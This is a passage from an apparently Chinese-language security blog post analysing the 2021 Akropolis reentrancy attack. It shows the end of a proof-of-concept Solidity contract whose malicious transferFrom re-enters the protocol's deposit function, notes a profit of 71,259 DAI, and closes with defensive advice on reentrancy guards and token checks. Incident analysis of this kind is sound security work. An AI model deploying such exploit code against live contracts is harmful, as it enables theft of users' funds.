transferFrom, a.k.a. &quot;Eye am the Captain now&quot;.</span><br><span class="line">    // this will be the malicious implementation *one million dollars*</span><br><span class="line">    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        console.log(&quot;transferFrom&quot;);</span><br><span class="line">        emit ReEntered(dyPoolBalance);</span><br><span class="line">        address[] memory tokensIn = new address[](1);</span><br><span class="line">        tokensIn[0] = address(dai);</span><br><span class="line">        uint[] memory amountsIn = new uint[](1);</span><br><span class="line">        amountsIn[0] = deposit;</span><br><span class="line">        nDepositDai = savingsModule.deposit(curveYPool, tokensIn, amountsIn);</span><br><span class="line">        console.log(&quot;nDepositDai    :&quot;, nDepositDai);   </span><br><span class="line"></span><br><span class="line">        dyPoolBalance = dyPool.balanceOf(address(this));</span><br><span class="line">        console.log(&quot;dyPoolBalance DAI:     &quot;, dyPoolBalance);   </span><br><span class="line">        emit DyPoolBalance(1, dyPoolBalance);</span><br><span class="line"></span><br><span class="line">        return dai.transferFrom(address(this), curveYPool, 1*10**18);</span><br><span class="line">        //return true;</span><br><span class="line">        </span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">    function balanceCheck(string memory title) internal &#123;</span><br><span class="line">        console.log(&quot;------------------------&quot;);</span><br><span class="line">        console.log(title);</span><br><span class="line">        daiBalance = dai.balanceOf(address(this));</span><br><span class="line">        console.log(&quot;DAI: &quot;, daiBalance / 10**18);   </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/19/Akropolis%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6-%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/Snipaste_2021-10-19_17-12-24.png" alt="Snipaste_2021-10-19_17-12-24"></p>
+<p>ＰＯＣ中在一笔交易中重入３次，共获利71259个DAI。</p>
+<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>　　　在对交易池进行存、取的操作时，类似于发币转账的过程，一定要注意到防重入的思想，同时当交易池中包含多种代币时，一定要对存入的代币进行校验，以免数据交接不对等出现各种问题。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>Post author:  </strong>Janson Woods</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>Post link:  </strong>
+          <a href="/2021/10/19/Akropolis攻击事件-重入攻击/" target="_blank" title="Akropolis攻击事件-重入攻击">http://example.com/2021/10/19/Akropolis攻击事件-重入攻击/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>Copyright Notice:   </strong>
+            All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            unless stating additionally.
+          </li>
+         
+        </ul>
+<div>
+
+      
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+      
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A4%8D%E7%9B%98%E5%88%86%E6%9E%90%E3%80%81%E9%97%AA%E7%94%B5%E8%B4%B7%E3%80%81%E9%87%8D%E5%85%A5%E3%80%81/" rel="tag">复盘分析、闪电贷、重入、</a></li></ul>
+
+      
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/10/15/compound%E4%BB%A3%E5%B8%81%E5%88%86%E5%8F%91%E8%BF%87%E5%A4%9A%E6%BC%8F%E6%B4%9E1012/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Compound第62提案升级导致奖励分发过多</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="toc-sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Akropolis%E7%9A%84%E4%BA%A4%E6%98%93%E6%A8%A1%E5%BC%8F"><span class="nav-number">1.</span> <span class="nav-text">Akropolis的交易模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E6%AC%A1%E6%94%BB%E5%87%BB%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0%E4%B8%BA%EF%BC%9Adeposit%E5%B9%B6%E6%9C%AA%E5%AF%B9%E5%AD%98%E5%85%A5%E7%9A%84%E4%BB%A3%E5%B8%81%E8%BF%9B%E8%A1%8C%E6%A0%A1%E9%AA%8C%EF%BC%8C%E4%BD%BF%E5%BE%97%E5%8F%AF%E4%BB%A5%E5%B0%86%E4%BB%BB%E4%BD%95%E4%BB%A3%E5%B8%81%E6%89%93%E5%85%A5protocol%E4%B8%AD%EF%BC%8C%E5%90%8C%E6%97%B6%E5%B9%B6%E6%B2%A1%E6%9C%89%E8%BF%9B%E8%A1%8C%E9%98%B2%E9%87%8D%E5%85%A5%E7%9A%84%E6%A3%80%E6%9F%A5%EF%BC%8C%E5%AF%BC%E8%87%B4%E5%87%BA%E7%8E%B0%E7%9A%84%E4%BA%8C%E6%AC%A1%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB%E3%80%82"><span class="nav-number">2.</span> <span class="nav-text">本次攻击的漏洞原因为：deposit并未对存入的代币进行校验，使得可以将任何代币打入protocol中，同时并没有进行防重入的检查，导致出现的二次重入攻击。</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%AE%80%E8%BF%B0%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">攻击简述：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#0xe1f375a47172b5612d96496a4599247049f07c9a7d518929fbe296b0c281e04d"><span class="nav-number">2.1.0.1.</span> <span class="nav-text">0xe1f375a47172b5612d96496a4599247049f07c9a7d518929fbe296b0c281e04d</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E9%80%9A%E8%BF%87%E8%BF%99%E5%85%B6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1%E6%93%8D%E4%BD%9C%E5%88%A9%E7%94%A8%E9%97%AA%E7%94%B5%E8%B4%B7%E6%9D%A5%E7%9A%842474%E4%B8%AADAI%E4%BD%9C%E4%B8%BA%E6%8A%95%E5%85%A5%EF%BC%8C%E8%8E%B7%E5%BE%97%EF%BC%94%EF%BC%99%EF%BC%90%EF%BC%90%E4%B8%AADAI%E3%80%82%E9%87%8D%E5%A4%8D%E5%A4%9A%E6%AC%A1%EF%BC%8C%E5%85%B1%E6%94%AB%E5%8F%962-000-000%E7%BE%8E%E5%85%83%E7%9A%84%E6%95%B0%E5%AD%97%E8%B4%A7%E5%B8%81%E8%B5%84%E4%BA%A7%EF%BC%81"><span class="nav-number">3.</span> <span class="nav-text">攻击者通过这其中的一次操作利用闪电贷来的2474个DAI作为投入，获得４９００个DAI。重复多次，共攫取2,000,000美元的数字货币资产！</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#POC%EF%BC%9A"><span class="nav-number">3.1.</span> <span class="nav-text">POC：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="nav-number">3.2.</span> <span class="nav-text">总结：</span></a></li></ol></li></ol>
+    
+    </div>
+  </aside>
+
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      	<div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2013 - 2021 SCS All Rights Reserved.</p>
+	      
+	      
+    		<p class="busuanzi_uv">
+				UV : <span id="busuanzi_value_site_uv"></span> |  
+				PV : <span id="busuanzi_value_site_pv"></span>
+		    </p>
+  		   
+		</div>
+
+		
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/categories" class="mobile-nav-link">Categories</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/scripts.js"></script>
+
+
+
+
+
+  
+<script src="/js/dialog.js"></script>
+
+
+
+
+
+
+
+
+
+	<div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            您已调整页面字体大小
+          </div>
+        </div>
+      
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            夜间模式已经开启，再次单击按钮即可关闭 
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            SCS
+          </div>
+          <div class="panel-body">
+            Copyright © 2021 Janson Woods All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
+    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
+  
+</body>
+</html>
